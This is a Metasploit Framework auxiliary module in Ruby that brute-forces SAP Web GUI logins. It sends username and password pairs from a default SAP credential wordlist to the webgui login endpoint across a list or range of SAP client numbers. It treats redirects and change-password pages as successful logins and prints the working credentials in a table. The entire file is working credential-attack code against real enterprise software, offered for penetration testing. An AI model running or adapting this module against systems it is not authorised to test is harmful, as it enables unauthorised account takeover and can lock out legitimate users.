##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nuñez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy. 
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute
	
	def initialize
		super(
			'Name' => 'SAP Web GUI Brute Force',
			'Version' => '$Revision$',
			'Description' => %q{
				SAP Web GUI Brute Force.
				},
			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
			'Author' => [ 'nmonkee' ],
			'License' => BSD_LICENSE
			)
		register_options([
		    OptString.new('URI',[true, 'URI', "/"]),
		    OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
            OptBool.new('DEFAULT_CRED',[false, 'Check using the default password and username',true]),
			], self.class)
		register_autofilter_ports([80])
	end
	
	def run_host(ip)
		uri = datastore['URI']
		if datastore['CLIENT'].nil?
			print_status("Using default SAP client list")
			client = ['000','001','066']
		else
		client = []
			if datastore['CLIENT'] =~ /^\d{3},/
				client = datastore['CLIENT'].split(/,/)
				print_status("Brute forcing clients #{datastore['CLIENT']}")
			elsif datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
				array = datastore['CLIENT'].split(/-/)
				client = (array.at(0)..array.at(1)).to_a
				print_status("Brute forcing clients #{datastore['CLIENT']}")
			elsif datastore['CLIENT'] =~ /^\d{3}\z/
				client.push(datastore['CLIENT'])
				print_status("Brute forcing client #{datastore['CLIENT']}")
			else  
				print_status("Invalid CLIENT - using default SAP client list instead")
				client = ['000','001','066']
			end
		end
		saptbl = Msf::Ui::Console::Table.new( Msf::Ui::Console::Table::Style::Default,
              'Header'  => "[SAP] Credentials",
              'Prefix'  => "\n",
              'Postfix' => "\n",
              'Indent'  => 1,
              'Columns' => ["host","port","client","user","pass"])
		if datastore['DEFAULT_CRED']
			datastore['USERPASS_FILE'] = Msf::Config.data_directory + '/wordlists/sap_default.txt'
		end
		if datastore['USERPASS_FILE']
			credentials = extract_word_pair(datastore['USERPASS_FILE'])
			credentials.each do |u,p|
				client.each do |cli|
					success = bruteforce(ip,uri,u,p,cli)
					if success == true
						saptbl << [ip,datastore['RPORT'],cli,u,p]
					end
				end
			end
		else
			#todo
		end
		print(saptbl.to_s)
	end
	
	def bruteforce(rhost,uri,user,pass,cli)
		begin
			path = "sap/bc/gui/sap/its/webgui/"
		    cookie = "Active=true; sap-usercontext=sap-language=EN&sap-client=#{cli}"
			res = send_request_cgi({
				'uri'    => "#{uri}#{path}",
				'method' => 'POST',
				'cookie' => cookie,
				'vars_post' => {
					'sap-system-login-oninputprocessing' => 'onLogin',
					'sap-urlscheme' => '',
					'sap-system-login' => 'onLogin',
					'sap-system-login-basic_auth' => '',
					'sap-system-login-cookie_disabled' => '',
					'sysid' => '',
					'sap-client' => cli,
					'sap-user' => user,
					'sap-password' => pass,
					'sap-language' => 'EN',
					}
				})
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error("#{rhost}:#{datastore['RPORT']} - Service failed to respond")
			return
		end
		
		if res and res.code == 302
			return true
		end

		if res and res.code == 200
			if res.body =~ /log on again/
				return false
			elsif res.body =~ /<title>Change Password - SAP Web Application Server<\/title>/
				return true
			elsif res.body =~ /Password logon no longer possible - too many failed attempts/
				print_error("#{rhost}:#{datastore['RPORT']} - #{user} locked in client #{cli}")
				return false
			end
		else
			print_error("#{rhost}:#{rport} - error trying #{user}/#{pass} against client #{cli}")
		end
		return
	end
end
